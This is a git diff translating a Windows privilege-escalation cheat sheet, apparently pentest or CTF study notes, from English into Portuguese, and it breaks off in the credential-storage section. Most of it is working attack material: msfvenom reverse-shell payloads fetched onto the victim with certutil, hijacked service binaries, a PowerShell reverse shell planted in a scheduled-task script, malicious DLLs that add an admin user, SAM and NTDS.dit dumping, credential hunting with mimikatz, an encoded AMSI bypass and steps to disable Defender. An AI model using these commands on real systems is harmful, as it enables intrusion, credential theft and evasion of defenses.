@@ -1,67 +1,67 @@
-# Privilege Escalation Windows
+# Escalação de Privilégios Windows
 
-## Table of Contents
+## Índice
 
-- [Enumeration](#enumeration)
-- [Service Exploitation](#service-exploitation)
-- [Potato Exploits](#potato-exploits) ➜ [Detailed Guide](4.5.Potato-Exploits.md)
-- [SeBackupPrivilege Abuse](#sebackupprivilege-abuse)
-- [Registry Credentials](#registry-credentials)
-- [Credential Hunting](#credential-hunting)
-- [Enumeration Tools](#enumeration-tools) ➜ [Detailed Guide](4.6.Windows-PrivEsc-Tools.md)
+- [Enumeração](#enumeração)
+- [Exploração de Serviços](#exploração-de-serviços)
+- [Potato Exploits](#potato-exploits) ➜ [Guia Detalhado](Potato-Exploits.md)
+- [Abuso de SeBackupPrivilege](#abuso-de-sebackupprivilege)
+- [Credenciais no Registro](#credenciais-no-registro)
+- [Caça a Credenciais](#caça-a-credenciais)
+- [Ferramentas de Enumeração](#ferramentas-de-enumeração) ➜ [Guia Detalhado](Windows-PrivEsc-Tools.md)
 - [AlwaysInstallElevated](#alwaysinstallelevated)
-- [Scheduled Tasks](#scheduled-tasks)
+- [Tarefas Agendadas](#tarefas-agendadas)
 - [DLL Hijacking](#dll-hijacking)
-- [AV Evasion](#av-evasion)
-- [Credential Storage Exploitation](#credential-storage-exploitation)
-- [UAC Bypass](#uac-bypass)
-- [See Also](#see-also)
+- [Evasão de AV](#evasão-de-av)
+- [Exploração de Armazenamento de Credenciais](#exploração-de-armazenamento-de-credenciais)
+- [Bypass de UAC](#bypass-de-uac)
+- [Veja Também](#veja-também)
 
 ---
 
-## Enumeration
+## Enumeração
 
-### Quick Enumeration (One-liner)
+### Enumeração Rápida (One-liner)
 
 ```cmd
-:: Full system info
+:: Informações completas do sistema
 systeminfo && whoami /all && net users && net localgroup administrators
 
-:: Check exploitable privileges
+:: Verificar privilégios exploráveis
 whoami /priv | findstr /i "SeImpersonate SeAssignPrimary SeBackup SeRestore SeTakeOwnership SeDebug"
 ```
 
 ```powershell
-# PowerShell one-liner enum
-$p=whoami /priv;if($p-match'SeImpersonate'){Write-Host '[!] Potato Exploit possible!' -ForegroundColor Red}
+# One-liner de enumeração PowerShell
+$p=whoami /priv;if($p-match'SeImpersonate'){Write-Host '[!] Potato Exploit possível!' -ForegroundColor Red}
 ```
 
-### User & Privilege Checks
+### Verificações de Usuário e Privilégio
 
-| Privilege | Exploitation |
+| Privilégio | Exploração |
 | :--- | :--- |
 | SeImpersonatePrivilege | Potato Exploits (SigmaPotato, GodPotato) |
 | SeAssignPrimaryTokenPrivilege | Potato Exploits |
-| SeBackupPrivilege | Dump SAM/SYSTEM, copy protected files |
-| SeRestorePrivilege | Overwrite protected files |
-| SeTakeOwnershipPrivilege | Take ownership of any file |
-| SeDebugPrivilege | Inject into processes |
+| SeBackupPrivilege | Dump SAM/SYSTEM, copiar arquivos protegidos |
+| SeRestorePrivilege | Sobrescrever arquivos protegidos |
+| SeTakeOwnershipPrivilege | Tomar posse de qualquer arquivo |
+| SeDebugPrivilege | Injetar em processos |
 
 ---
 
-## Service Exploitation
+## Exploração de Serviços
 
-### Unquoted Service Path (One-liner)
+### Caminho de Serviço sem Aspas (One-liner)
 
 ```cmd
-:: Find unquoted service paths
+:: Encontrar caminhos de serviço sem aspas
 wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """"
 ```
 
-> ถ้า service path มี space และไม่มี quotes
+> Se o caminho do serviço tem espaço e não tem aspas
 
 ```shell
-# Attacker
+# Atacante
 
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o Service.exe 
 
@@ -69,25 +69,25 @@ msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/shell/rever
 
 python -m http.server 80
 
-# Victim
+# Vítima
 
-sc qc vulnerable_service 
+sc qc servico_vulneravel
 
 C:\Program Files\Vuln\Service.exe
 
 certutil -urlcache -split -f "http://$lhost/reverse.exe" "C:\Program Files\Vuln\Service.exe"
 
-sc stop vulnerable_service
+sc stop servico_vulneravel
 
-sc start vulnerable_service
+sc start servico_vulneravel
 ```
 
 ---
 
-### Weak Service Permissions
+### Permissões Fracas em Serviços
 
 ```cmd
-# Attacker
+# Atacante
 
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o reverse.exe 
 
@@ -95,22 +95,22 @@ msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/shell/rever
 
 python -m http.server 80
 
-# Victim
+# Vítima
 
-accesschk.exe /accepteula -uwcqv "Everyone" "service_name"
+accesschk.exe /accepteula -uwcqv "Everyone" "nome_do_servico"
 
 certutil -urlcache -split -f "http://192.168.45.187/reverse.exe" "C:\reverse.exe"
 
-sc config service_name binpath= "C:\reverse.exe"
+sc config nome_do_servico binpath= "C:\reverse.exe"
 
-sc start service_name
+sc start nome_do_servico
 ```
 
 ---
 
-### Service Binary Hijacking
+### Sequestro de Binário de Serviço
 
-#### Example: xampp (mysql)
+#### Exemplo: xampp (mysql)
 
 ```c
 #include <stdlib.h>
@@ -124,12 +124,12 @@ return 0;
 ```
 
 ```shell
-# Attacker
+# Atacante
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 
 python -m http.server 80
 
-# Victim
+# Vítima
 
 powershell -ep bypass
 
@@ -145,7 +145,7 @@ whoami /priv
 
 shutdown /r /t 0
 
-# Check if new user was created after restart
+# Verificar se novo usuário foi criado após reinicialização
 net user
 ```
 
@@ -153,17 +153,17 @@ net user
 
 ## Potato Exploits
 
-> Used when `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` is enabled
+> Usado quando `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege` está habilitado
 
-**📖 See full guide: [4.5.Potato-Exploits.md](4.5.Potato-Exploits.md)**
+**📖 Veja o guia completo: [Potato-Exploits.md](Potato-Exploits.md)**
 
-| Tool | Windows Version | Quick Command |
+| Ferramenta | Versão do Windows | Comando Rápido |
 | --- | --- | --- |
-| SigmaPotato | Modern Windows | `.\SigmaPotato.exe --revshell $lhost $lport` |
-| GodPotato | All versions | `.\GodPotato.exe -cmd "cmd /c whoami"` |
+| SigmaPotato | Windows Moderno | `.\SigmaPotato.exe --revshell $lhost $lport` |
+| GodPotato | Todas as versões | `.\GodPotato.exe -cmd "cmd /c whoami"` |
 | PrintSpoofer | Server 2016/2019 | `.\PrintSpoofer.exe -i -c cmd` |
 
-### Quick Check
+### Verificação Rápida
 
 ```cmd
 whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken"
@@ -171,72 +171,72 @@ whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken"
 
 ---
 
-## SeBackupPrivilege Abuse
+## Abuso de SeBackupPrivilege
 
-> Used to dump SAM/SYSTEM registry hives or copy protected files
+> Usado para dump de SAM/SYSTEM ou copiar arquivos protegidos
 
-### Check Privilege
+### Verificar Privilégio
 
 ```cmd
 whoami /priv | findstr SeBackupPrivilege
 ```
 
-### Dump SAM & SYSTEM
+### Dump de SAM e SYSTEM
 
 ```cmd
-# Create backup of registry hives
+# Criar backup dos hives do registro
 reg save HKLM\SAM C:\Users\Public\SAM
 reg save HKLM\SYSTEM C:\Users\Public\SYSTEM
 
-# Transfer to attacker machine (via Evil-WinRM)
+# Transferir para a máquina atacante (via Evil-WinRM)
 download SAM
 download SYSTEM
 
-# On Kali - Extract hashes
+# No Kali - Extrair hashes
 impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 ```
 
-### Dump NTDS.dit (Domain Controller)
+### Dump de NTDS.dit (Controlador de Domínio)
 
 ```powershell
-# Enable SeBackupPrivilege in current session
+# Habilitar SeBackupPrivilege na sessão atual
 Import-Module .\SeBackupPrivilegeUtils.dll
 Import-Module .\SeBackupPrivilegeCmdLets.dll
 Set-SeBackupPrivilege
 
-# Create shadow copy
+# Criar shadow copy
 $shadow = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\", "ClientAccessible")
 $shadowPath = (Get-WmiObject Win32_ShadowCopy | Sort-Object InstallDate -Descending)[0].DeviceObject
 
-# Copy NTDS.dit from shadow
+# Copiar NTDS.dit da shadow
 Copy-FileSeBackupPrivilege "$shadowPath\Windows\NTDS\ntds.dit" C:\Users\Public\ntds.dit
 
-# Copy SYSTEM hive
+# Copiar hive SYSTEM
 reg save HKLM\SYSTEM C:\Users\Public\SYSTEM
 ```
 
-### Robocopy Alternative
+### Alternativa com Robocopy
 
 ```cmd
-# Robocopy with backup mode to copy protected files
+# Robocopy em modo backup para copiar arquivos protegidos
 robocopy /B C:\Windows\NTDS C:\Users\Public ntds.dit
 ```
 
 ---
 
-## Registry Credentials
+## Credenciais no Registro
 
-### Auto Logon Credentials
+### Credenciais de Auto Logon
 
-> Windows may store auto-logon credentials in registry
+> O Windows pode armazenar credenciais de logon automático no registro
 
 ```cmd
-# Check for stored auto-logon credentials
+# Verificar credenciais de auto-logon armazenadas
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
 
-# One-liner to get all
+# One-liner para obter tudo
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword DefaultDomainName"
 ```
 
@@ -246,23 +246,23 @@ Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlo
   Select-Object DefaultUserName, DefaultPassword, DefaultDomainName
 ```
 
-### Saved Credentials
+### Credenciais Salvas
 
 ```cmd
-# List saved credentials
+# Listar credenciais salvas
 cmdkey /list
 
-# If credentials are saved, use runas
+# Se houver credenciais salvas, usar runas
 runas /savecred /user:Administrator cmd.exe
 ```
 
-### PuTTY Saved Sessions
+### Sessões Salvas do PuTTY
 
 ```cmd
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
 ```
 
-### VNC Passwords
+### Senhas do VNC
 
 ```cmd
 reg query "HKCU\Software\ORL\WinVNC3\Password"
@@ -271,74 +271,74 @@ reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password
 
 ---
 
-## Credential Hunting
+## Caça a Credenciais
 
-### Quick File Search (One-liner)
+### Busca Rápida de Arquivos (One-liner)
 
 ```cmd
-:: CMD - Search all interesting extensions
+:: CMD - Buscar extensões interessantes
 for %e in (txt xml ini config json yaml yml conf cfg env bak old log rdp vnc ppk pem kdbx db sqlite) do @dir /s /b C:\Users\*.%e 2>nul
 ```
 
 ```powershell
-# PowerShell - Search all interesting extensions
+# PowerShell - Buscar extensões interessantes
 "txt","xml","ini","config","json","yaml","yml","conf","cfg","env","bak","old","log","rdp","vnc","ppk","pem","kdbx","db" | %{ gci C:\Users -Recurse -Filter "*.$_" -EA 0 } | select FullName
 ```
 
-### Search Entire Drive
+### Buscar em Todo o Drive
 
 ```cmd
-:: Search C:\ (slower but thorough)
+:: Buscar em C:\ (mais lento mas completo)
 for %e in (txt xml ini config json yaml yml conf cfg env bak old log rdp vnc ppk pem kdbx) do @dir /s /b C:\*.%e 2>nul
 ```
 
 ```powershell
-# PowerShell entire drive
+# PowerShell - drive completo
 "txt","xml","ini","config","json","yaml","yml","conf","cfg","env","bak","old","log","rdp","vnc","ppk","pem","kdbx" | %{ gci C:\ -Recurse -Filter "*.$_" -EA 0 } | select FullName
 ```
 
-### Search Files for Passwords
+### Buscar Senhas em Arquivos
 
 ```cmd
-# Search common file types
+# Buscar em tipos comuns de arquivo
 findstr /si password *.txt *.ini *.xml *.config *.cfg
 findstr /spin "password" *.*
 
-# Search entire drive
+# Buscar no drive inteiro
 dir /s /b *pass*.txt *cred*.txt *vnc*.ini *.config
 ```
 
 ```powershell
-# PowerShell recursive search
+# Busca recursiva com PowerShell
 Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.xml,*.config -Recurse -ErrorAction SilentlyContinue |
   Select-String -Pattern "password|pwd|pass" -ErrorAction SilentlyContinue
 ```
 
-### Search Files by Name Pattern
+### Buscar Arquivos por Padrão de Nome
 
 ```cmd
-:: Find files with password/cred/secret in filename
+:: Encontrar arquivos com password/cred/secret no nome
 dir /s /b C:\Users\*pass* C:\Users\*cred* C:\Users\*secret* C:\Users\*key* C:\Users\*token* 2>nul
 ```
 
 ```powershell
-# PowerShell - Find by name pattern
+# PowerShell - encontrar por padrão de nome
 gci C:\Users -Recurse -EA 0 | ?{ $_.Name -match "pass|cred|secret|login|key|token|backup" } | select FullName
 ```
 
-### Common Credential Locations
+### Localizações Comuns de Credenciais
 
 ```cmd
-# Unattend files (installation passwords)
+# Arquivos Unattend (senhas de instalação)
 type C:\Windows\Panther\Unattend.xml 2>nul
 type C:\Windows\Panther\Unattended.xml 2>nul
 type C:\Windows\Panther\UnattendGC\Unattend.xml 2>nul
 
-# Web config files
+# Arquivos de config web
 type C:\inetpub\wwwroot\web.config 2>nul
 type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config 2>nul
 
-# McAfee files
+# Arquivos McAfee
 type C:\ProgramData\McAfee\Common Framework\SiteList.xml 2>nul
 
 # VNC
@@ -346,130 +346,130 @@ type C:\Users\*\.vnc\passwd 2>nul
 type C:\Program Files\UltraVNC\ultravnc.ini 2>nul
 ```
 
-### PowerShell History
+### Histórico do PowerShell
 
 ```powershell
-# Current user history
+# Histórico do usuário atual
 type (Get-PSReadLineOption).HistorySavePath
 
-# All users history
+# Histórico de todos os usuários
 Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue | 
   ForEach-Object { Write-Output "=== $_ ==="; Get-Content $_ }
 ```
 
-### Wireless Passwords
+### Senhas de Wi-Fi
 
 ```cmd
-# List saved WiFi profiles
+# Listar perfis Wi-Fi salvos
 netsh wlan show profiles
 
-# Get password for specific profile
-netsh wlan show profile name="ProfileName" key=clear
+# Obter senha de perfil específico
+netsh wlan show profile name="NomeDoPerfil" key=clear
 ```
 
-### DPAPI Protected Credentials
+### Credenciais Protegidas por DPAPI
 
 ```cmd
-# List DPAPI credentials
+# Listar credenciais DPAPI
 dir C:\Users\*\AppData\Local\Microsoft\Credentials\* 2>nul
 dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\* 2>nul
 
-# Use mimikatz to decrypt
+# Usar mimikatz para descriptografar
 mimikatz.exe
 sekurlsa::dpapi
-dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\GUID
+dpapi::cred /in:C:\Users\usuario\AppData\Local\Microsoft\Credentials\GUID
 ```
 
 ---
 
-## Enumeration Tools
+## Ferramentas de Enumeração
 
-**📖 See detailed tool guide: [4.6.Windows-PrivEsc-Tools.md](4.6.Windows-PrivEsc-Tools.md)**
+**📖 Veja o guia detalhado: [Windows-PrivEsc-Tools.md](Windows-PrivEsc-Tools.md)**
 
-| Tool | Command | Purpose |
+| Ferramenta | Comando | Finalidade |
 | --- | --- | --- |
-| winPEAS | `.\winPEASx64.exe` | Comprehensive enumeration |
-| PowerUp | `Invoke-AllChecks` | Service/privilege checks |
-| PrivescCheck | `Invoke-PrivescCheck` | Modern PowerUp alternative |
-| Seatbelt | `.\Seatbelt.exe -group=all` | Security reconnaissance |
+| winPEAS | `.\winPEASx64.exe` | Enumeração abrangente |
+| PowerUp | `Invoke-AllChecks` | Verificações de serviço/privilégio |
+| PrivescCheck | `Invoke-PrivescCheck` | Alternativa moderna ao PowerUp |
+| Seatbelt | `.\Seatbelt.exe -group=all` | Reconhecimento de segurança |
 
 ---
 
 ## AlwaysInstallElevated
 
-> Registry keys must be set to 1
+> As chaves de registro devem estar definidas como 1
 
 ```cmd
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 
-### Exploit
+### Exploração
 
 ```shell
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f msi -o malicious.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f msi -o malicioso.msi
 ```
 
 ```cmd
-msiexec /quiet /qn /i malicious.msi
+msiexec /quiet /qn /i malicioso.msi
 ```
 
 ---
 
-## Scheduled Tasks
+## Tarefas Agendadas
 
-### Enumerate Scheduled Tasks
+### Enumerar Tarefas Agendadas
 
 ```cmd
-# List all scheduled tasks
+# Listar todas as tarefas agendadas
 schtasks /query /fo LIST /v
 
-# Filter by task name
+# Filtrar por nome da tarefa
 schtasks /query /fo LIST | findstr "TaskName"
 
-# Query specific task
-schtasks /query /tn "\Microsoft\TaskName" /v /fo list
+# Consultar tarefa específica
+schtasks /query /tn "\Microsoft\NomeDaTarefa" /v /fo list
 ```
 
-#### PowerShell Enumeration
+#### Enumeração com PowerShell
 
 ```powershell
-# List non-Microsoft tasks (custom tasks)
+# Listar tarefas não-Microsoft (tarefas customizadas)
 Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft\*' }
 
-# Get task details with actions
+# Obter detalhes com ações
 Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft\*' } | 
   ForEach-Object { 
     $task = $_
     $actions = $task | Get-ScheduledTaskInfo
     [PSCustomObject]@{
-      TaskName = $task.TaskName
-      TaskPath = $task.TaskPath
-      State = $task.State
+      NomeTarefa = $task.TaskName
+      CaminhoTarefa = $task.TaskPath
+      Estado = $task.State
       UserId = $task.Principal.UserId
     }
   } | Format-Table -AutoSize
 
-# Get task action (executable path)
-(Get-ScheduledTask -TaskName "TaskName").Actions
+# Obter ação da tarefa (caminho do executável)
+(Get-ScheduledTask -TaskName "NomeDaTarefa").Actions
 ```
 
-### Find Writable Scheduled Task Scripts
+### Encontrar Scripts de Tarefas Graváveis
 
 ```cmd
-# Check permissions on task script
-icacls "C:\Path\To\Script.bat"
-icacls "C:\Path\To\Script.ps1"
+# Verificar permissões no script da tarefa
+icacls "C:\Caminho\Para\Script.bat"
+icacls "C:\Caminho\Para\Script.ps1"
 ```
 
-### Exploitation
+### Exploração
 
 ```powershell
-# If script is writable, replace with reverse shell
-# Edit the script file
-notepad C:\Path\To\Script.ps1
+# Se o script for gravável, substituir por reverse shell
+# Editar o arquivo de script
+notepad C:\Caminho\Para\Script.ps1
 
-# Add PowerShell reverse shell
+# Adicionar reverse shell PowerShell
 $LHOST = "$lhost"
 $LPORT = 4444
 $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT)
@@ -493,7 +493,7 @@ $TCPClient.Close()
 ```
 
 ```shell
-# On Kali - wait for task to execute
+# No Kali - aguardar a tarefa executar
 nc -lvnp 4444
 ```
 
@@ -501,23 +501,23 @@ nc -lvnp 4444
 
 ## DLL Hijacking
 
-### Detection with Procmon
+### Detecção com Procmon
 
 ```cmd
-# Find missing DLLs
-procmon.exe    # Filter: Result = NAME NOT FOUND, Path ends with .dll
+# Encontrar DLLs ausentes
+procmon.exe    # Filtro: Result = NAME NOT FOUND, Path termina com .dll
 ```
 
-### PowerShell Service Enumeration
+### Enumeração de Serviços com PowerShell
 
 ```powershell
-# List services with paths (exclude svchost)
+# Listar serviços com caminhos (excluir svchost)
 Get-CimInstance -ClassName Win32_Service | 
   Where-Object { $_.PathName -and ($_.PathName -notmatch 'svchost.exe') } | 
   Select-Object Name, DisplayName, StartName, PathName | 
   Format-Table -AutoSize
 
-# Find services running as SYSTEM
+# Encontrar serviços rodando como SYSTEM
 Get-WmiObject -Class Win32_Service | 
   Where-Object { 
     $_.StartName -match "LocalSystem|NT AUTHORITY\\SYSTEM" -and 
@@ -528,48 +528,48 @@ Get-WmiObject -Class Win32_Service |
   Format-Table -AutoSize
 ```
 
-### Find Writable Directories in PATH
+### Encontrar Diretórios Graváveis no PATH
 
 ```powershell
-# Check writable folders in PATH (DLL search order abuse)
+# Verificar pastas graváveis no PATH (abuso de ordem de busca de DLL)
 $env:Path.Split(';') | ForEach-Object {
   $p = $_.Trim()
   if ($p -and (Test-Path $p)) {
     $acl = (icacls $p) -join "`n"
     if ($acl -match 'Users.*M' -or $acl -match 'Everyone.*M') {
-      [PSCustomObject]@{ Path = $p; ACL = $acl }
+      [PSCustomObject]@{ Caminho = $p; ACL = $acl }
     }
   }
 } | Format-Table -AutoSize
 ```
 
-### Find Writable Service Directories
+### Encontrar Diretórios de Serviço Graváveis
 
 ```powershell
-# Find service folders writable by Users
+# Encontrar pastas de serviço graváveis por usuários
 Get-WmiObject -Class Win32_Service | ForEach-Object {
   $svc = $_
   if (-not $svc.PathName) { return }
   $exe = ($svc.PathName -replace '"','').Split(' ')[0]
   if (-not $exe) { return }
-  $folder = Split-Path $exe -ErrorAction SilentlyContinue
-  if (-not $folder -or -not (Test-Path $folder)) { return }
-  if ($folder -match [regex]::Escape($env:windir) -and $folder -match 'System32') { return }
-  try { $aclText = icacls $folder 2>$null } catch { $aclText = $null }
+  $pasta = Split-Path $exe -ErrorAction SilentlyContinue
+  if (-not $pasta -or -not (Test-Path $pasta)) { return }
+  if ($pasta -match [regex]::Escape($env:windir) -and $pasta -match 'System32') { return }
+  try { $aclText = icacls $pasta 2>$null } catch { $aclText = $null }
   if ($aclText -and ($aclText -match 'Users.*M' -or $aclText -match 'Everyone.*M')) {
     [PSCustomObject]@{
-      Service = $svc.Name
-      ExePath = $exe
-      Folder = $folder
+      Servico = $svc.Name
+      CaminhoExe = $exe
+      Pasta = $pasta
     }
   }
 } | Format-Table -AutoSize
 ```
 
-### Create Malicious DLL
+### Criar DLL Maliciosa
 
 ```c
-// malicious.c - Add user to administrators
+// maliciosa.c - Adicionar usuário ao grupo de administradores
 #include <windows.h>
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
@@ -581,408 +581,408 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 }
 ```
 
-#### Create DLL with Reverse Shell
+#### Criar DLL com Reverse Shell
 
 ```c
-// revshell.c - Execute reverse shell
+// revshell.c - Executar reverse shell
 #include <windows.h>
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
     if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
-        system("powershell -e <BASE64_ENCODED_PAYLOAD>");
+        system("powershell -e <PAYLOAD_BASE64>");
     }
     return TRUE;
 }
 ```
 
-### Compile DLL
+### Compilar DLL
 
 ```shell
-# Install MinGW on Kali
+# Instalar MinGW no Kali
 sudo apt install mingw-w64
 
-# Compile x64 DLL
-x86_64-w64-mingw32-gcc -shared -o malicious.dll malicious.c -O2 -s
+# Compilar DLL x64
+x86_64-w64-mingw32-gcc -shared -o maliciosa.dll maliciosa.c -O2 -s
 
-# Compile x86 DLL
-i686-w64-mingw32-gcc -shared -o malicious.dll malicious.c -O2 -s
+# Compilar DLL x86
+i686-w64-mingw32-gcc -shared -o maliciosa.dll maliciosa.c -O2 -s
 
-# Verify DLL
-file malicious.dll  # Should show PE32+ (DLL) x86-64
+# Verificar DLL
+file maliciosa.dll  # Deve mostrar PE32+ (DLL) x86-64
 ```
 
-### Exploitation Steps
+### Passos de Exploração
 
 ```shell
-# 1. Transfer DLL to target
+# 1. Transferir DLL para o alvo
 python -m http.server 80
 
-# 2. On target - download and place DLL
-certutil -urlcache -split -f "http://$lhost/malicious.dll" "C:\VulnerableApp\missing.dll"
+# 2. No alvo - baixar e posicionar a DLL
+certutil -urlcache -split -f "http://$lhost/maliciosa.dll" "C:\AppVulneravel\dll_ausente.dll"
 
-# 3. Restart service or wait for application to load DLL
-sc stop VulnerableService
-sc start VulnerableService
+# 3. Reiniciar serviço ou aguardar aplicação carregar a DLL
+sc stop ServicoVulneravel
+sc start ServicoVulneravel
 
-# 4. Connect with new admin user
+# 4. Conectar com o novo usuário admin
 impacket-psexec backdoor:Password123!@$rhost
 ```
 
 ---
 
-## AV Evasion
+## Evasão de AV
 
-> Techniques to bypass Windows Defender and AV detection
+> Técnicas para contornar Windows Defender e detecção de AV
 
 ### ThreatChecker
 
-> Identifies which bytes in a file trigger AV detection
+> Identifica quais bytes do arquivo disparam a detecção do AV
 
 ```shell
-# Download from GitHub
+# Baixar do GitHub
 # https://github.com/rasta-mouse/ThreatCheck
 
-# Check file for AV signatures
+# Verificar arquivo contra assinaturas AV
 ThreatChecker.exe -f payload.exe
 
-# Check with specific engine
+# Verificar com engine específica
 ThreatChecker.exe -f payload.exe -e AMSI
 ThreatChecker.exe -f payload.exe -e Defender
 
-# Example output shows byte offset of detection
-# Use this to modify specific parts of payload
+# A saída mostra o offset de bytes da detecção
+# Use para modificar partes específicas do payload
 ```
 
 ### DefenderCheck
 
 ```shell
-# Similar tool for Defender
+# Ferramenta similar para o Defender
 DefenderCheck.exe payload.exe
 ```
 
-### Obfuscation Techniques
+### Técnicas de Ofuscação
 
-#### AMSI Bypass
+#### Bypass de AMSI
 
 ```powershell
-# PowerShell AMSI Bypass (Matt Graeber)
+# Bypass de AMSI PowerShell (Matt Graeber)
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
-# One-liner (encoded)
+# One-liner (codificado)
 [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
 ```
 
-#### Disable Defender (Requires Admin)
+#### Desativar Defender (Requer Admin)
 
 ```cmd
-:: Disable real-time protection
+:: Desativar proteção em tempo real
 Set-MpPreference -DisableRealtimeMonitoring $true
 
-:: Add exclusion path
+:: Adicionar exclusão de caminho
 Set-MpPreference -ExclusionPath "C:\Temp"
 
-:: Add exclusion for process
+:: Adicionar exclusão de processo
 Set-MpPreference -ExclusionProcess "mimikatz.exe"
 ```
 
-#### Payload Modification
+#### Modificação de Payload
 
 ```shell
-# Shikata Ga Nai encoding (multiple iterations)
+# Codificação Shikata Ga Nai (múltiplas iterações)
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=4444 \
   -e x64/xor_dynamic -i 5 -f exe -o payload.exe
 
-# Change entry point
-# Modify metadata
-# Add benign code sections
+# Alterar entry point
+# Modificar metadados
+# Adicionar seções de código benigno
 ```
 
 ---
 
-## Credential Storage Exploitation
+## Exploração de Armazenamento de Credenciais
 
-### Windows Credential Manager Locations
+### Localizações do Windows Credential Manager
 
-> Dump stored credentials from Windows Vault
+> Dump de credenciais armazenadas no Windows Vault
 
 ```powershell
-# List all stored credentials
+# Listar todas as credenciais armazenadas
 cmdkey /list
 ```
 
-> Export stored credentials (requires credentials stored in vault)
+> Exportar credenciais armazenadas (requer credenciais no vault)
 
 ```powershell
-# Access credentials programmatically
-$cred = New-Object System.Management.Automation.PSCredential("domain\user", (ConvertTo-SecureString "password" -AsPlainText -Force))
+# Acessar credenciais programaticamente
+$cred = New-Object System.Management.Automation.PSCredential("dominio\usuario", (ConvertTo-SecureString "senha" -AsPlainText -Force))
 ```
 
-### PowerShell History Extraction
+### Extração de Histórico do PowerShell
 
-> Check PowerShell history file
+> Verificar arquivo de histórico do PowerShell
 
 ```powershell
 type $PROFILE\PSReadline\ConsoleHost_history.txt
 ```
 
-> Search for passwords in history
+> Buscar senhas no histórico
 
 ```powershell
 Get-History | Where-Object {$_.CommandLine -match "password|pwd|pass"} | Select-Object CommandLine
 ```
 
-> Or check history file directly
+> Ou verificar diretamente o arquivo de histórico
 
 ```powershell
 type "C:\Users\$username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
 ```
 
-### Registry Credential Storage
+### Armazenamento de Credenciais no Registro
 
-> Dump AutoLogon credentials
+> Dump de credenciais AutoLogon
 
 ```powershell
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
 ```
 
-> Get RDP credentials from registry
+> Obter credenciais RDP do registro
 
 ```powershell
 reg query "HKCU\Software\Microsoft\Terminal Server Client\Default" /s
 ```
 
-> Check for cached credentials
+> Verificar credenciais em cache
 
 ```powershell
 reg query "HKLM\Security\Cache" 
 ```
 
-### File-Based Credential Storage
+### Armazenamento de Credenciais em Arquivo
 
-> Search for unattend.xml with credentials
+> Buscar unattend.xml com credenciais
 
 ```powershell
 dir C:\Windows\Panther\ -Recurse -Filter unattend.xml
 Get-ChildItem "C:\Windows\Panther\" -Recurse -Filter "*.xml" | type
 ```
 
-> Look for sysprep.inf
+> Procurar sysprep.inf
 
 ```powershell
 type "C:\Windows\System32\sysprep\sysprep.inf"
 type "C:\Windows\sysprep.inf"
 ```
 
-> Search common credential file locations
+> Buscar localizações comuns de credenciais em arquivo
 
 ```powershell
 # .git-credentials
 type "C:\Users\$username\.git-credentials"
 
-# SSH keys
+# Chaves SSH
 dir "C:\Users\$username\.ssh\" -File
 
-# RDP connection files
+# Arquivos de conexão RDP
 dir "C:\Users\$username\AppData\Local\Microsoft\Terminal Server Client\" -Recurse
 ```
 
-> Search for hardcoded passwords in config files
+> Buscar senhas hardcoded em arquivos de configuração
 
 ```powershell
